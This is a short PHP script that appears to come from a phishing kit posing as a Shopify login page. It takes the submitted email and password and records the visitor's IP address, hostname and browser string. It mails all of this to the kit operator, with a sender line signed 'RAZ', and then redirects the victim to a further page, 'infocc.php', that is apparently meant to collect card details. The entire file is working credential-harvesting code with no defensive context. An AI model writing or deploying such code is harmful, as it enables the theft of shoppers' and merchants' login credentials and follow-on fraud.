<?php
include 'email.php';
if($_POST["username"] != "" and $_POST["password"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Shopify Login Info-----------------------\n";
$message .= "Email            : ".$_POST['username']."\n";
$message .= "Password           : ".$_POST['password']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- RAZ --------------|\n";


$subject = "Shopify Login";
$headers = "From: RAZ <k1r4@app-crew.id>";
mail($to, $subject, $message, $headers);

$banner=rand();
$banner=md5($praga);
  header ("Location: infocc.php?cmd=login_submit&id=$banner$banner&session=$banner$banner");
}else{
header ("Location: index.php");
}

?>